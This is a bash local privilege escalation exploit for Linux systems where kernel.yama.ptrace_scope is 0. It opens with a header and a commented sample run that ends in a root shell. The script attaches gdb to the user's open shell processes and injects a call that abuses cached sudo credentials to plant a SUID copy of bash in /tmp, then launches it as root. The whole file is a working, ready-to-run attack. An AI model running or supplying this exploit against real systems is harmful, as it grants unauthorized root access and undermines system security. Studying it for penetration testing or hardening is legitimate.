#!/usr/bin/env bash

#######################################################
#                                                     #
#           'ptrace_scope' misconfiguration           #
#              Local Privilege Escalation             #
#                                                     #
#######################################################

# Affected operating systems (TESTED):
# 	Parrot Home/Workstation    4.6 (Latest Version)
#       Parrot Security            4.6 (Latest Version)
#	CentOS / RedHat            7.6 (Latest Version)
#	Kali Linux              2018.4 (Latest Version)

# Authors: Marcelo Vazquez  (s4vitar)
# 	   Victor Lasa       (vowkin)

#┌─[s4vitar@parrot]─[~/Desktop/Exploit/Privesc]
#└──╼ $./exploit.sh
#
#[*] Checking if 'ptrace_scope' is set to 0... [√]
#[*] Checking if 'GDB' is installed...         [√]
#[*] System seems vulnerable!                  [√]
#
#[*] Starting attack...
#[*] PID -> sh
#[*] Path 824: /home/s4vitar
#[*] PID -> bash
#[*] Path 832: /home/s4vitar/Desktop/Exploit/Privesc
#[*] PID -> sh
#[*] Path
#[*] PID -> sh
#[*] Path
#[*] PID -> sh
#[*] Path
#[*] PID -> sh
#[*] Path
#[*] PID -> bash
#[*] Path 1816: /home/s4vitar/Desktop/Exploit/Privesc
#[*] PID -> bash
#[*] Path 1842: /home/s4vitar
#[*] PID -> bash
#[*] Path 1852: /home/s4vitar/Desktop/Exploit/Privesc
#[*] PID -> bash
#[*] Path 1857: /home/s4vitar/Desktop/Exploit/Privesc
#
#[*] Cleaning up...                            [√]
#[*] Spawning root shell...                    [√]
#
#bash-4.4# whoami
#root
#bash-4.4# id
#uid=1000(s4vitar) gid=1000(s4vitar) euid=0(root) egid=0(root) grupos=0(root),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(debian-tor),124(bluetooth),136(scanner),1000(s4vitar)
#bash-4.4#


function startAttack(){
  tput civis && pgrep "^(echo $(cat /etc/shells | tr '/' ' ' | awk 'NF{print $NF}' | tr '\n' '|'))$" -u "$(id -u)" | sed '$ d' | while read shell_pid; do
    if [ $(cat /proc/$shell_pid/comm 2>/dev/null) ] || [ $(pwdx $shell_pid 2>/dev/null) ]; then
      echo "[*] PID -> "$(cat "/proc/$shell_pid/comm" 2>/dev/null)
      echo "[*] Path $(pwdx $shell_pid 2>/dev/null)"
    fi; echo 'call system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1")' | gdb -q -n -p "$shell_pid" >/dev/null 2>&1
    done

    if [ -f /tmp/bash ]; then
      /tmp/bash -p -c 'echo -ne "\n[*] Cleaning up..."
                       rm /tmp/bash
                       echo -e "                            [√]"
                       echo -ne "[*] Spawning root shell..."
                       echo -e "                    [√]\n"
                       tput cnorm && bash -p'
    else
      echo -e "\n[*] Could not copy SUID to /tmp/bash          [✗]"
    fi
}

echo -ne "[*] Checking if 'ptrace_scope' is set to 0..."
if grep -q "0" < /proc/sys/kernel/yama/ptrace_scope; then
  echo " [√]"
  echo -ne "[*] Checking if 'GDB' is installed..."
  if command -v gdb >/dev/null 2>&1; then
    echo -e "         [√]"
    echo -e "[*] System seems vulnerable!                  [√]\n"
    echo -e "[*] Starting attack..."

    startAttack

  else
    echo "         [✗]"
    echo "[*] System is NOT vulnerable :(               [✗]"
  fi
else
  echo " [✗]"
  echo "[*] System is NOT vulnerable :(               [✗]"
fi; tput cnorm